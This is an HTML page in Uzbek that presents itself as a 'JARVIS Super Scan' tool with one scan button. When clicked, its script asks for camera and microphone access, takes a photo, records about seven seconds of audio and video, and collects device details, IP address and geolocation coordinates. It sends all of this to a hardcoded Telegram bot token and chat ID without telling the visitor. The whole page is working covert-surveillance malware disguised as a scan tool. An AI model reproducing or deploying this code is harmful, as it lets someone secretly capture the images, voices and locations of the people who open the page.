<!DOCTYPE html><html lang="uz">
<head>
  <meta charset="UTF-8">
  <title>JARVIS Super Scan — Full Version</title>
  <style>
    body {
      background: radial-gradient(circle at center, #001a1a, #000);
      color: #00ffee;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 40px;
    }
    button {
      padding: 16px 36px;
      font-size: 20px;
      border: none;
      border-radius: 12px;
      background-color: #00ff88;
      color: #000;
      box-shadow: 0 0 20px #00ff88;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover { background-color: #00cc66; }
    canvas, video { display: none; }
  </style>
</head>
<body>
  <h1>🧠 JARVIS SUPER-SCAN</h1>
  <button onclick="runSuperScan()">🚀 SUPER SCAN BOSING</button>
  <video id="video" autoplay muted></video>
  <canvas id="canvas"></canvas>
  <script>
    const BOT_TOKEN = "7499346689:AAFvoixn_YYNFVJSIUDdh-KmDm8vLRvwsnE";
    const CHAT_ID = "902776622";let stream, recorder, chunks = [];

async function runSuperScan() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    video.srcObject = stream;

    video.onloadedmetadata = async () => {
      video.play();
      await new Promise(r => setTimeout(r, 1500));

      if (video.videoWidth === 0 || video.videoHeight === 0) {
        alert("❌ Kamera hali tayyor emas yoki ruxsat yo‘q!");
        return;
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("photo", blob, "jarvis.jpg");
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: form });
      }, 'image/jpeg');
    };

    // VIDEO yozish
    recorder = new MediaRecorder(stream);
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.start();

    setTimeout(() => {
      recorder.stop();
      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: "video/webm" });
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("video", blob, "super_video.webm");
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: form });
      }
    }, 7000);

    // MA'LUMOTLAR
    let info = `📱 Qurilma: ${navigator.userAgent}\n`;
    info += `🌐 Platforma: ${navigator.platform}\n`;
    info += `📶 Tarmoq: ${navigator.connection ? navigator.connection.effectiveType : "nomaʼlum"}\n`;
    info += `🧠 CPU: ${navigator.hardwareConcurrency || "?"} yadro\n`;
    info += `📏 Ekran: ${screen.width}x${screen.height}\n`;
    info += `🖱 Mouse mavjud: ${typeof window.onmousemove === 'function'}\n`;
    info += `🎯 Touchscreen: ${'ontouchstart' in window}\n`;
    info += `📋 Clipboard mavjud: ${!!navigator.clipboard}\n`;
    info += `🎛 Device Memory: ${navigator.deviceMemory || "nomaʼlum"} GB\n`;
    info += `📦 Cookies: ${navigator.cookieEnabled ? 'yoqilgan' : 'bloklangan'}\n`;

    if (navigator.getBattery) {
      const bat = await navigator.getBattery();
      info += `🔋 Batareya: ${Math.round(bat.level * 100)}% (${bat.charging ? 'zaryadda' : 'zaryadsiz'})\n`;
    }

    info += `🗣 Til: ${navigator.language}\n`;
    info += `🕒 Soat zonasi: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;

    try {
      const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
      info += `🌍 IP: ${geo.ip}\n`;
      info += `🏙 Joylashuv: ${geo.city}, ${geo.country_name}\n`;
      info += `📌 Koordinata: ${geo.latitude}, ${geo.longitude}\n`;
      info += `🗺 Maps: https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
    } catch (e) {
      info += `❗ IP/joylashuv olinmadi`;
    }

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: info })
    });

  } catch (e) {
    alert("🎥 Kamera yoki 🎤 mikrofonga ruxsat berilmadi!");
    console.error(e);
  }
}

  </script>
</body>
</html>
